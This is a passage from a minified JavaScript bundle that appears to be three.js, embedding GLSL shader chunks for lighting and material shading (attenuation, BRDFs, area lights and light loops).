	result += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;
	result += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );
	return result;
}
vec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in vec3 normal ) {
	vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
	vec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );
	return irradiance;
}
vec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {
	vec3 irradiance = ambientLightColor;
	return irradiance;
}
float getDistanceAttenuation( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {
	#if defined ( LEGACY_LIGHTS )
		if ( cutoffDistance > 0.0 && decayExponent > 0.0 ) {
			return pow( saturate( - lightDistance / cutoffDistance + 1.0 ), decayExponent );
		}
		return 1.0;
	#else
		float distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );
		if ( cutoffDistance > 0.0 ) {
			distanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );
		}
		return distanceFalloff;
	#endif
}
float getSpotAttenuation( const in float coneCosine, const in float penumbraCosine, const in float angleCosine ) {
	return smoothstep( coneCosine, penumbraCosine, angleCosine );
}
#if NUM_DIR_LIGHTS > 0
	struct DirectionalLight {
		vec3 direction;
		vec3 color;
	};
	uniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];
	void getDirectionalLightInfo( const in DirectionalLight directionalLight, out IncidentLight light ) {
		light.color = directionalLight.color;
		light.direction = directionalLight.direction;
		light.visible = true;
	}
#endif
#if NUM_POINT_LIGHTS > 0
	struct PointLight {
		vec3 position;
		vec3 color;
		float distance;
		float decay;
	};
	uniform PointLight pointLights[ NUM_POINT_LIGHTS ];
	void getPointLightInfo( const in PointLight pointLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = pointLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float lightDistance = length( lVector );
		light.color = pointLight.color;
		light.color *= getDistanceAttenuation( lightDistance, pointLight.distance, pointLight.decay );
		light.visible = ( light.color != vec3( 0.0 ) );
	}
#endif
#if NUM_SPOT_LIGHTS > 0
	struct SpotLight {
		vec3 position;
		vec3 direction;
		vec3 color;
		float distance;
		float decay;
		float coneCos;
		float penumbraCos;
	};
	uniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];
	void getSpotLightInfo( const in SpotLight spotLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = spotLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float angleCos = dot( light.direction, spotLight.direction );
		float spotAttenuation = getSpotAttenuation( spotLight.coneCos, spotLight.penumbraCos, angleCos );
		if ( spotAttenuation > 0.0 ) {
			float lightDistance = length( lVector );
			light.color = spotLight.color * spotAttenuation;
			light.color *= getDistanceAttenuation( lightDistance, spotLight.distance, spotLight.decay );
			light.visible = ( light.color != vec3( 0.0 ) );
		} else {
			light.color = vec3( 0.0 );
			light.visible = false;
		}
	}
#endif
#if NUM_RECT_AREA_LIGHTS > 0
	struct RectAreaLight {
		vec3 color;
		vec3 position;
		vec3 halfWidth;
		vec3 halfHeight;
	};
	uniform sampler2D ltc_1;	uniform sampler2D ltc_2;
	uniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];
#endif
#if NUM_HEMI_LIGHTS > 0
	struct HemisphereLight {
		vec3 direction;
		vec3 skyColor;
		vec3 groundColor;
	};
	uniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];
	vec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in vec3 normal ) {
		float dotNL = dot( normal, hemiLight.direction );
		float hemiDiffuseWeight = 0.5 * dotNL + 0.5;
		vec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );
		return irradiance;
	}
#endif`,od=`#ifdef USE_ENVMAP
	vec3 getIBLIrradiance( const in vec3 normal ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, worldNormal, 1.0 );
			return PI * envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	vec3 getIBLRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 reflectVec = reflect( - viewDir, normal );
			reflectVec = normalize( mix( reflectVec, normal, roughness * roughness) );
			reflectVec = inverseTransformDirection( reflectVec, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, reflectVec, roughness );
			return envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	#ifdef USE_ANISOTROPY
		vec3 getIBLAnisotropyRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in vec3 bitangent, const in float anisotropy ) {
			#ifdef ENVMAP_TYPE_CUBE_UV
				vec3 bentNormal = cross( bitangent, viewDir );
				bentNormal = normalize( cross( bentNormal, bitangent ) );
				bentNormal = normalize( mix( bentNormal, normal, pow2( pow2( 1.0 - anisotropy * ( 1.0 - roughness ) ) ) ) );
				return getIBLRadiance( viewDir, bentNormal, roughness );
			#else
				return vec3( 0.0 );
			#endif
		}
	#endif
#endif`,ld=`ToonMaterial material;
material.diffuseColor = diffuseColor.rgb;`,cd=`varying vec3 vViewPosition;
struct ToonMaterial {
	vec3 diffuseColor;
};
void RE_Direct_Toon( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 irradiance = getGradientIrradiance( geometryNormal, directLight.direction ) * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Toon( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Toon
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Toon`,dd=`BlinnPhongMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularColor = specular;
material.specularShininess = shininess;
material.specularStrength = specularStrength;`,ud=`varying vec3 vViewPosition;
struct BlinnPhongMaterial {
	vec3 diffuseColor;
	vec3 specularColor;
	float specularShininess;
	float specularStrength;
};
void RE_Direct_BlinnPhong( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
	reflectedLight.directSpecular += irradiance * BRDF_BlinnPhong( directLight.direction, geometryViewDir, geometryNormal, material.specularColor, material.specularShininess ) * material.specularStrength;
}
void RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_BlinnPhong
#define RE_IndirectDiffuse		RE_IndirectDiffuse_BlinnPhong`,pd=`PhysicalMaterial material;
material.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );
vec3 dxy = max( abs( dFdx( nonPerturbedNormal ) ), abs( dFdy( nonPerturbedNormal ) ) );
float geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );
material.roughness = max( roughnessFactor, 0.0525 );material.roughness += geometryRoughness;
material.roughness = min( material.roughness, 1.0 );
#ifdef IOR
	material.ior = ior;
	#ifdef USE_SPECULAR
		float specularIntensityFactor = specularIntensity;
		vec3 specularColorFactor = specularColor;
		#ifdef USE_SPECULAR_COLORMAP
			specularColorFactor *= texture2D( specularColorMap, vSpecularColorMapUv ).rgb;
		#endif
		#ifdef USE_SPECULAR_INTENSITYMAP
			specularIntensityFactor *= texture2D( specularIntensityMap, vSpecularIntensityMapUv ).a;
		#endif
		material.specularF90 = mix( specularIntensityFactor, 1.0, metalnessFactor );
	#else
		float specularIntensityFactor = 1.0;
		vec3 specularColorFactor = vec3( 1.0 );
		material.specularF90 = 1.0;
	#endif
	material.specularColor = mix( min( pow2( ( material.ior - 1.0 ) / ( material.ior + 1.0 ) ) * specularColorFactor, vec3( 1.0 ) ) * specularIntensityFactor, diffuseColor.rgb, metalnessFactor );
#else
	material.specularColor = mix( vec3( 0.04 ), diffuseColor.rgb, metalnessFactor );
	material.specularF90 = 1.0;
#endif
#ifdef USE_CLEARCOAT
	material.clearcoat = clearcoat;
	material.clearcoatRoughness = clearcoatRoughness;
	material.clearcoatF0 = vec3( 0.04 );
	material.clearcoatF90 = 1.0;
	#ifdef USE_CLEARCOATMAP
		material.clearcoat *= texture2D( clearcoatMap, vClearcoatMapUv ).x;
	#endif
	#ifdef USE_CLEARCOAT_ROUGHNESSMAP
		material.clearcoatRoughness *= texture2D( clearcoatRoughnessMap, vClearcoatRoughnessMapUv ).y;
	#endif
	material.clearcoat = saturate( material.clearcoat );	material.clearcoatRoughness = max( material.clearcoatRoughness, 0.0525 );
	material.clearcoatRoughness += geometryRoughness;
	material.clearcoatRoughness = min( material.clearcoatRoughness, 1.0 );
#endif
#ifdef USE_IRIDESCENCE
	material.iridescence = iridescence;
	material.iridescenceIOR = iridescenceIOR;
	#ifdef USE_IRIDESCENCEMAP
		material.iridescence *= texture2D( iridescenceMap, vIridescenceMapUv ).r;
	#endif
	#ifdef USE_IRIDESCENCE_THICKNESSMAP
		material.iridescenceThickness = (iridescenceThicknessMaximum - iridescenceThicknessMinimum) * texture2D( iridescenceThicknessMap, vIridescenceThicknessMapUv ).g + iridescenceThicknessMinimum;
	#else
		material.iridescenceThickness = iridescenceThicknessMaximum;
	#endif
#endif
#ifdef USE_SHEEN
	material.sheenColor = sheenColor;
	#ifdef USE_SHEEN_COLORMAP
		material.sheenColor *= texture2D( sheenColorMap, vSheenColorMapUv ).rgb;
	#endif
	material.sheenRoughness = clamp( sheenRoughness, 0.07, 1.0 );
	#ifdef USE_SHEEN_ROUGHNESSMAP
		material.sheenRoughness *= texture2D( sheenRoughnessMap, vSheenRoughnessMapUv ).a;
	#endif
#endif
#ifdef USE_ANISOTROPY
	#ifdef USE_ANISOTROPYMAP
		mat2 anisotropyMat = mat2( anisotropyVector.x, anisotropyVector.y, - anisotropyVector.y, anisotropyVector.x );
		vec3 anisotropyPolar = texture2D( anisotropyMap, vAnisotropyMapUv ).rgb;
		vec2 anisotropyV = anisotropyMat * normalize( 2.0 * anisotropyPolar.rg - vec2( 1.0 ) ) * anisotropyPolar.b;
	#else
		vec2 anisotropyV = anisotropyVector;
	#endif
	material.anisotropy = length( anisotropyV );
	if( material.anisotropy == 0.0 ) {
		anisotropyV = vec2( 1.0, 0.0 );
	} else {
		anisotropyV /= material.anisotropy;
		material.anisotropy = saturate( material.anisotropy );
	}
	material.alphaT = mix( pow2( material.roughness ), 1.0, pow2( material.anisotropy ) );
	material.anisotropyT = tbn[ 0 ] * anisotropyV.x + tbn[ 1 ] * anisotropyV.y;
	material.anisotropyB = tbn[ 1 ] * anisotropyV.x - tbn[ 0 ] * anisotropyV.y;
#endif`,fd=`struct PhysicalMaterial {
	vec3 diffuseColor;
	float roughness;
	vec3 specularColor;
	float specularF90;
	#ifdef USE_CLEARCOAT
		float clearcoat;
		float clearcoatRoughness;
		vec3 clearcoatF0;
		float clearcoatF90;
	#endif
	#ifdef USE_IRIDESCENCE
		float iridescence;
		float iridescenceIOR;
		float iridescenceThickness;
		vec3 iridescenceFresnel;
		vec3 iridescenceF0;
	#endif
	#ifdef USE_SHEEN
		vec3 sheenColor;
		float sheenRoughness;
	#endif
	#ifdef IOR
		float ior;
	#endif
	#ifdef USE_TRANSMISSION
		float transmission;
		float transmissionAlpha;
		float thickness;
		float attenuationDistance;
		vec3 attenuationColor;
	#endif
	#ifdef USE_ANISOTROPY
		float anisotropy;
		float alphaT;
		vec3 anisotropyT;
		vec3 anisotropyB;
	#endif
};
vec3 clearcoatSpecularDirect = vec3( 0.0 );
vec3 clearcoatSpecularIndirect = vec3( 0.0 );
vec3 sheenSpecularDirect = vec3( 0.0 );
vec3 sheenSpecularIndirect = vec3(0.0 );
vec3 Schlick_to_F0( const in vec3 f, const in float f90, const in float dotVH ) {
    float x = clamp( 1.0 - dotVH, 0.0, 1.0 );
    float x2 = x * x;
    float x5 = clamp( x * x2 * x2, 0.0, 0.9999 );
    return ( f - vec3( f90 ) * x5 ) / ( 1.0 - x5 );
}
float V_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {
	float a2 = pow2( alpha );
	float gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );
	float gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );
	return 0.5 / max( gv + gl, EPSILON );
}
float D_GGX( const in float alpha, const in float dotNH ) {
	float a2 = pow2( alpha );
	float denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;
	return RECIPROCAL_PI * a2 / pow2( denom );
}
#ifdef USE_ANISOTROPY
	float V_GGX_SmithCorrelated_Anisotropic( const in float alphaT, const in float alphaB, const in float dotTV, const in float dotBV, const in float dotTL, const in float dotBL, const in float dotNV, const in float dotNL ) {
		float gv = dotNL * length( vec3( alphaT * dotTV, alphaB * dotBV, dotNV ) );
		float gl = dotNV * length( vec3( alphaT * dotTL, alphaB * dotBL, dotNL ) );
		float v = 0.5 / ( gv + gl );
		return saturate(v);
	}
	float D_GGX_Anisotropic( const in float alphaT, const in float alphaB, const in float dotNH, const in float dotTH, const in float dotBH ) {
		float a2 = alphaT * alphaB;
		highp vec3 v = vec3( alphaB * dotTH, alphaT * dotBH, a2 * dotNH );
		highp float v2 = dot( v, v );
		float w2 = a2 / v2;
		return RECIPROCAL_PI * a2 * pow2 ( w2 );
	}
#endif
#ifdef USE_CLEARCOAT
	vec3 BRDF_GGX_Clearcoat( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material) {
		vec3 f0 = material.clearcoatF0;
		float f90 = material.clearcoatF90;
		float roughness = material.clearcoatRoughness;
		float alpha = pow2( roughness );
		vec3 halfDir = normalize( lightDir + viewDir );
		float dotNL = saturate( dot( normal, lightDir ) );
		float dotNV = saturate( dot( normal, viewDir ) );
		float dotNH = saturate( dot( normal, halfDir ) );
		float dotVH = saturate( dot( viewDir, halfDir ) );
		vec3 F = F_Schlick( f0, f90, dotVH );
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
		return F * ( V * D );
	}
#endif
vec3 BRDF_GGX( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material ) {
	vec3 f0 = material.specularColor;
	float f90 = material.specularF90;
	float roughness = material.roughness;
	float alpha = pow2( roughness );
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( f0, f90, dotVH );
	#ifdef USE_IRIDESCENCE
		F = mix( F, material.iridescenceFresnel, material.iridescence );
	#endif
	#ifdef USE_ANISOTROPY
		float dotTL = dot( material.anisotropyT, lightDir );
		float dotTV = dot( material.anisotropyT, viewDir );
		float dotTH = dot( material.anisotropyT, halfDir );
		float dotBL = dot( material.anisotropyB, lightDir );
		float dotBV = dot( material.anisotropyB, viewDir );
		float dotBH = dot( material.anisotropyB, halfDir );
		float V = V_GGX_SmithCorrelated_Anisotropic( material.alphaT, alpha, dotTV, dotBV, dotTL, dotBL, dotNV, dotNL );
		float D = D_GGX_Anisotropic( material.alphaT, alpha, dotNH, dotTH, dotBH );
	#else
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
	#endif
	return F * ( V * D );
}
vec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {
	const float LUT_SIZE = 64.0;
	const float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;
	const float LUT_BIAS = 0.5 / LUT_SIZE;
	float dotNV = saturate( dot( N, V ) );
	vec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );
	uv = uv * LUT_SCALE + LUT_BIAS;
	return uv;
}
float LTC_ClippedSphereFormFactor( const in vec3 f ) {
	float l = length( f );
	return max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );
}
vec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {
	float x = dot( v1, v2 );
	float y = abs( x );
	float a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;
	float b = 3.4175940 + ( 4.1616724 + y ) * y;
	float v = a / b;
	float theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;
	return cross( v1, v2 ) * theta_sintheta;
}
vec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {
	vec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];
	vec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];
	vec3 lightNormal = cross( v1, v2 );
	if( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );
	vec3 T1, T2;
	T1 = normalize( V - N * dot( V, N ) );
	T2 = - cross( N, T1 );
	mat3 mat = mInv * transposeMat3( mat3( T1, T2, N ) );
	vec3 coords[ 4 ];
	coords[ 0 ] = mat * ( rectCoords[ 0 ] - P );
	coords[ 1 ] = mat * ( rectCoords[ 1 ] - P );
	coords[ 2 ] = mat * ( rectCoords[ 2 ] - P );
	coords[ 3 ] = mat * ( rectCoords[ 3 ] - P );
	coords[ 0 ] = normalize( coords[ 0 ] );
	coords[ 1 ] = normalize( coords[ 1 ] );
	coords[ 2 ] = normalize( coords[ 2 ] );
	coords[ 3 ] = normalize( coords[ 3 ] );
	vec3 vectorFormFactor = vec3( 0.0 );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );
	float result = LTC_ClippedSphereFormFactor( vectorFormFactor );
	return vec3( result );
}
#if defined( USE_SHEEN )
float D_Charlie( float roughness, float dotNH ) {
	float alpha = pow2( roughness );
	float invAlpha = 1.0 / alpha;
	float cos2h = dotNH * dotNH;
	float sin2h = max( 1.0 - cos2h, 0.0078125 );
	return ( 2.0 + invAlpha ) * pow( sin2h, invAlpha * 0.5 ) / ( 2.0 * PI );
}
float V_Neubelt( float dotNV, float dotNL ) {
	return saturate( 1.0 / ( 4.0 * ( dotNL + dotNV - dotNL * dotNV ) ) );
}
vec3 BRDF_Sheen( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, vec3 sheenColor, const in float sheenRoughness ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float D = D_Charlie( sheenRoughness, dotNH );
	float V = V_Neubelt( dotNV, dotNL );
	return sheenColor * ( D * V );
}
#endif
float IBLSheenBRDF( const in vec3 normal, const in vec3 viewDir, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	float r2 = roughness * roughness;
	float a = roughness < 0.25 ? -339.2 * r2 + 161.4 * roughness - 25.9 : -8.48 * r2 + 14.3 * roughness - 9.95;
	float b = roughness < 0.25 ? 44.0 * r2 - 23.7 * roughness + 3.26 : 1.97 * r2 - 3.27 * roughness + 0.72;
	float DG = exp( a * dotNV + b ) + ( roughness < 0.25 ? 0.0 : 0.1 * ( roughness - 0.25 ) );
	return saturate( DG * RECIPROCAL_PI );
}
vec2 DFGApprox( const in vec3 normal, const in vec3 viewDir, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	const vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );
	const vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );
	vec4 r = roughness * c0 + c1;
	float a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;
	vec2 fab = vec2( - 1.04, 1.04 ) * a004 + r.zw;
	return fab;
}
vec3 EnvironmentBRDF( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness ) {
	vec2 fab = DFGApprox( normal, viewDir, roughness );
	return specularColor * fab.x + specularF90 * fab.y;
}
#ifdef USE_IRIDESCENCE
void computeMultiscatteringIridescence( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float iridescence, const in vec3 iridescenceF0, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#else
void computeMultiscattering( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#endif
	vec2 fab = DFGApprox( normal, viewDir, roughness );
	#ifdef USE_IRIDESCENCE
		vec3 Fr = mix( specularColor, iridescenceF0, iridescence );
	#else
		vec3 Fr = specularColor;
	#endif
	vec3 FssEss = Fr * fab.x + specularF90 * fab.y;
	float Ess = fab.x + fab.y;
	float Ems = 1.0 - Ess;
	vec3 Favg = Fr + ( 1.0 - Fr ) * 0.047619;	vec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );
	singleScatter += FssEss;
	multiScatter += Fms * Ems;
}
#if NUM_RECT_AREA_LIGHTS > 0
	void RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
		vec3 normal = geometryNormal;
		vec3 viewDir = geometryViewDir;
		vec3 position = geometryPosition;
		vec3 lightPos = rectAreaLight.position;
		vec3 halfWidth = rectAreaLight.halfWidth;
		vec3 halfHeight = rectAreaLight.halfHeight;
		vec3 lightColor = rectAreaLight.color;
		float roughness = material.roughness;
		vec3 rectCoords[ 4 ];
		rectCoords[ 0 ] = lightPos + halfWidth - halfHeight;		rectCoords[ 1 ] = lightPos - halfWidth - halfHeight;
		rectCoords[ 2 ] = lightPos - halfWidth + halfHeight;
		rectCoords[ 3 ] = lightPos + halfWidth + halfHeight;
		vec2 uv = LTC_Uv( normal, viewDir, roughness );
		vec4 t1 = texture2D( ltc_1, uv );
		vec4 t2 = texture2D( ltc_2, uv );
		mat3 mInv = mat3(
			vec3( t1.x, 0, t1.y ),
			vec3(    0, 1,    0 ),
			vec3( t1.z, 0, t1.w )
		);
		vec3 fresnel = ( material.specularColor * t2.x + ( vec3( 1.0 ) - material.specularColor ) * t2.y );
		reflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );
		reflectedLight.directDiffuse += lightColor * material.diffuseColor * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );
	}
#endif
void RE_Direct_Physical( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	#ifdef USE_CLEARCOAT
		float dotNLcc = saturate( dot( geometryClearcoatNormal, directLight.direction ) );
		vec3 ccIrradiance = dotNLcc * directLight.color;
		clearcoatSpecularDirect += ccIrradiance * BRDF_GGX_Clearcoat( directLight.direction, geometryViewDir, geometryClearcoatNormal, material );
	#endif
	#ifdef USE_SHEEN
		sheenSpecularDirect += irradiance * BRDF_Sheen( directLight.direction, geometryViewDir, geometryNormal, material.sheenColor, material.sheenRoughness );
	#endif
	reflectedLight.directSpecular += irradiance * BRDF_GGX( directLight.direction, geometryViewDir, geometryNormal, material );
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {
	#ifdef USE_CLEARCOAT
		clearcoatSpecularIndirect += clearcoatRadiance * EnvironmentBRDF( geometryClearcoatNormal, geometryViewDir, material.clearcoatF0, material.clearcoatF90, material.clearcoatRoughness );
	#endif
	#ifdef USE_SHEEN
		sheenSpecularIndirect += irradiance * material.sheenColor * IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
	#endif
	vec3 singleScattering = vec3( 0.0 );
	vec3 multiScattering = vec3( 0.0 );
	vec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;
	#ifdef USE_IRIDESCENCE
		computeMultiscatteringIridescence( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.iridescence, material.iridescenceFresnel, material.roughness, singleScattering, multiScattering );
	#else
		computeMultiscattering( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.roughness, singleScattering, multiScattering );
	#endif
	vec3 totalScattering = singleScattering + multiScattering;
	vec3 diffuse = material.diffuseColor * ( 1.0 - max( max( totalScattering.r, totalScattering.g ), totalScattering.b ) );
	reflectedLight.indirectSpecular += radiance * singleScattering;
	reflectedLight.indirectSpecular += multiScattering * cosineWeightedIrradiance;
	reflectedLight.indirectDiffuse += diffuse * cosineWeightedIrradiance;
}
#define RE_Direct				RE_Direct_Physical
#define RE_Direct_RectArea		RE_Direct_RectArea_Physical
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Physical
#define RE_IndirectSpecular		RE_IndirectSpecular_Physical
float computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {
	return saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );
}`,hd=`
vec3 geometryPosition = - vViewPosition;
vec3 geometryNormal = normal;
vec3 geometryViewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( vViewPosition );
vec3 geometryClearcoatNormal = vec3( 0.0 );
#ifdef USE_CLEARCOAT
	geometryClearcoatNormal = clearcoatNormal;
#endif
#ifdef USE_IRIDESCENCE
	float dotNVi = saturate( dot( normal, geometryViewDir ) );
	if ( material.iridescenceThickness == 0.0 ) {
		material.iridescence = 0.0;
	} else {
		material.iridescence = saturate( material.iridescence );
	}
	if ( material.iridescence > 0.0 ) {
		material.iridescenceFresnel = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.specularColor );
		material.iridescenceF0 = Schlick_to_F0( material.iridescenceFresnel, 1.0, dotNVi );
	}
#endif
IncidentLight directLight;
#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )
	PointLight pointLight;
	#if defined( USE_SHADOWMAP ) && NUM_POINT_LIGHT_SHADOWS > 0
	PointLightShadow pointLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {
		pointLight = pointLights[ i ];
		getPointLightInfo( pointLight, geometryPosition, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS )
		pointLightShadow = pointLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getPointShadow( pointShadowMap[ i ], pointLightShadow.shadowMapSize, pointLightShadow.shadowBias, pointLightShadow.shadowRadius, vPointShadowCoord[ i ], pointLightShadow.shadowCameraNear, pointLightShadow.shadowCameraFar ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )
	SpotLight spotLight;
	vec4 spotColor;
	vec3 spotLightCoord;
	bool inSpotLightMap;
	#if defined( USE_SHADOWMAP ) && NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {
		spotLight = spotLights[ i ];
		getSpotLightInfo( spotLight, geometryPosition, directLight );
		#if ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#define SPOT_LIGHT_MAP_INDEX UNROLLED_LOOP_INDEX
